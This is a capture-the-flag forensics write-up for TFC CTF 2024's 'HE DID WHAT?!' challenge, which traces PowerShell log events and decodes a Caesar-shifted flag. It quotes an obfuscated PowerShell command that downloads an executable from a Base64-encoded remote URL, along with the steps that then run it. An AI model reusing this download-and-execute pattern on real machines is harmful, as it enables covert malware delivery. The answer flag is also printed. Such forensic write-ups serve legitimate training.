---
title: "HE DID WHAT?! - TFC CTF 2024"
category: "forensics"
subcategory: "classical"
type: "writeup"
tags: ["forensics", "tfcctf", "caesar", "cyberchef", "base64", "classical", "tfc-ctf", "tfc-ctf-2024", "2024", "ctf-writeup"]
summary: "The challenge provided a log file containing some verbose events that I've noticed when dealing with the first forensics chall, they were related to remote command executions in PowerShell, identified"
source:
  name: "CTFtime writeup #39363"
  url: "https://ctftime.org/writeup/39363"
ctf:
  name: "TFC CTF 2024"
  year: 2024
  challenge: "HE DID WHAT?!"
---

## Metadata

- **CTF:** TFC CTF 2024
- **Task:** HE DID WHAT?!
- **Author team:** Never7
- **CTFtime tags:** forensics, tfcctf
- **CTFtime:** <https://ctftime.org/writeup/39363>

---
The challenge provided a log file containing some verbose events that I've noticed when dealing with the first forensics chall, they were related to remote command executions in PowerShell, identified by Event ID 4104.  
The first notable event, dated 07-12-2024, included a reversed Base64 string.

The Base64 string was decoded using CyberChef, revealing the following command:

```  
Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9zaG9ydHVybC5hdC9pbnl1ag=="))) -OutFile "caca.exe"  
```

Decoding `aHR0cHM6Ly9zaG9ydHVybC5hdC9pbnl1ag==` resulted in the URL `<https://shorturl.at/inyuj>`, which, when accessed, downloaded the file caca.exe.

Additional logs indicated a series of PowerShell commands to manipulate the previously decoded string:

```  
$w9r4pBoZlnfIzH1keCtX = $FBtFFDr8NXp5.ToCharArray() ; [array]::Reverse($w9r4pBoZlnfIzH1keCtX) ; -join $w9r4pBoZlnfIzH1keCtX 2>&1> $null ;  
```

The reversed string $w9r4pBoZlnfIzH1keCtX was converted from Base64, and the script execution command was obfuscated:  
```  
$SCr = [SyStem.TexT.encODINg]::uTF8.GeTsTrInG([SYSteM.coNVErT]::froMBaSe64STrinG("$w9r4pBoZlnfIzH1keCtX")) ;  
```

Finally, the command executed caca.exe with the parameter `"VHEEVH}x3uwcnad6u3eac3pvaj6tf"`.

Using dotPeek, the caca.exe file was decompiled, revealing the following C# code:

```  
public static void td4306d885b1c98544112b830f9bd97c6()  
{  
string str1 = "";  
string str2 = "TFCCTF{fake_flag_haha}";  
int num = Strings.Len(str2);  
int Start = 1;  
while (Start <= num)  
{  
str1 += Conversions.ToString(Strings.Chr(checked (Strings.Asc(Strings.Mid(str2, Start, 1)) + 2)));  
checked { ++Start; }  
}  
}  
```

The function `td4306d885b1c98544112b830f9bd97c6` indicated that the encrypted flag was obfuscated with a Caesar cipher (shift of +2).

> The provided parameter `"VHEEVH}x3uwcnad6u3eac3pvaj6tf"` was decrypted by shifting each character's ASCII value by -2: using [dcode](<https://www.dcode.fr/caesar-cipher>) with `Shift/Key=2` and `Use a custom alphabet (A-Z0-9 chars only) checked`

This resulted in the actual flag: `TFCCTF{v1sual_b4s1c_a1nt_h4rd}`
